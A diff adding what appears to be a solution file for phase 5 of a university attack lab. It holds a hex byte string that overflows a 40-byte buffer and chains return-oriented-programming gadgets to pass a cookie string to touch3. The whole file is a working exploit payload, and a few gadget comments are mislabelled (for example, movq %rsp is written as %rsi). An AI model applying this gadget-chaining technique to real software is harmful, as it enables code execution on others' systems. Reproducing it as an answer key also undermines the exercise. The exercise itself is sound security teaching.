@@ -1,0 +1,56 @@
+/* level5_input.txt */
+41 41 41 41 41 41 41 41 
+41 41 41 41 41 41 41 41 
+41 41 41 41 41 41 41 41 
+41 41 41 41 41 41 41 41 
+41 41 41 41 41 41 41 41          /* 40 items to overflow the stack */
+
+/*  1. ret to addval_190
+    48 89 e0
+    movq %rsi, %rax (0x40 1a 06) */
+06 1a 40 00 00 00 00 00          
+
+/*  2. ret to addval_273
+    48 89 c7
+    movq %rax, %rdi (0x40 19 a2) */
+a2 19 40 00 00 00 00 00          
+
+/*  3. ret to getval_280
+    58
+    popq %rax (0x40 19 cc) */
+cc 19 40 00 00 00 00 00          
+
+/* 4. offset: 0x48 = 72 = 9 * 8 */
+48 00 00 00 00 00 00 00          
+
+/*  5. ret to getval_481
+    89 c2
+    movq %eax, %edx (0x40 19 dd) */
+dd 19 40 00 00 00 00 00          
+
+/*  6. ret to getval_159
+    89 d1
+    movq %edx, %ecx (0x40 1a 34)
+    38 c9 is functional nop instruction */
+34 1a 40 00 00 00 00 00          
+
+/*  7. ret to addval_436
+    89 ce
+    movq %ecx, %esi(0x 40 1a 13) */
+13 1a 40 00 00 00 00 00          
+
+/*  8. ret to add_xy
+    lea (%rdi, %rsi, 1), %rax(0x 40 19 d6) */
+d6 19 40 00 00 00 00 00          
+
+/*  9. ret to addval_273
+    48 89 c7
+    movq %rax, %rdi (0x40 19 a2) */
+a2 19 40 00 00 00 00 00          
+
+/* 10. ret to touch3 */
+fa 18 40 00 00 00 00 00          
+
+/* cookie string */
+35 39 62 39 39 37 66 61
+00 
